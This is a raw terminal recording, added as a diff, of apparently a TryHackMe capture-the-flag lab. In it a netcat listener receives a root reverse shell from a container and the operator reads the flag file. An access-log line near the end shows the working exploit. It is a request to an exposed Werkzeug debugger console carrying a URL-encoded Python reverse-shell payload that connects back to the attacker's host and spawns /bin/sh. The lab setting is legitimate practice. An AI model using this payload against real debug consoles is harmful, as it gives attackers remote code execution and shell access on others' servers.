@@ -1,0 +1,33 @@
+Script started on 2026-08-30 12:09:40+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 52750
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n16R16R[K[K[K[K[K[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[K/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[K[K[K[K[K[K[K[Kwhoami[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoam[Kwhoam[Kwhoami
+root
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16Rls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h;16R;16Rls
+[K;16[K;16[K;16R;16Rls
+/bin/sh: syntax error: unexpected ";"
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h;16R;16R
+[K;16R;16R
+/bin/sh: syntax error: unexpected ";"
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[K[K[K[K[K[K[K[Kls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K[0;0mDockerfile[m                   [1;34mpublic-docs[m
+[0;0mapp.py[m                       [0;0mrequirements.txt[m
+[0;0mflag-982374827648721338.txt[m  [1;34mstatic[m
+[1;34mprivate-docs[m                 [1;34mtemplates[m
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[K[K[K[K[K[K[K[Kcat f;[Kl  [Ka[7mg-982374827648721338.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mcat fla[27mg-982374827648721338.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat flag-982374827648721338.txt
+[Kcat flag[Kcat flag[Kcat flag-982374827648721338.txt
+THM{SSRF2RCE_2_1337_4_M3}
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[K[K[K[K[K[K[K[Kbash[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hbash
+[Kbash[Kbash[Kbash
+/bin/sh: bash: not found
+/usr/src/app # [6n[K[?2004h/usr/src/app # [6n;16R;16R[K[K[K[K[K[K[K[Kexit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K192.168.170.199 - - [30/Aug/2026 09:10:50] "GET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.170.199%22%2C6047))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fsh%22)&frm=0&s=gAgQO8BtCHXgb6MuI4Vy HTTP/1.1" 200 -
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004h[?2004l
+[K[?2004h[?2004l
+Script done on 2026-08-30 12:10:56+03:00 [COMMAND_EXIT_CODE="1"]
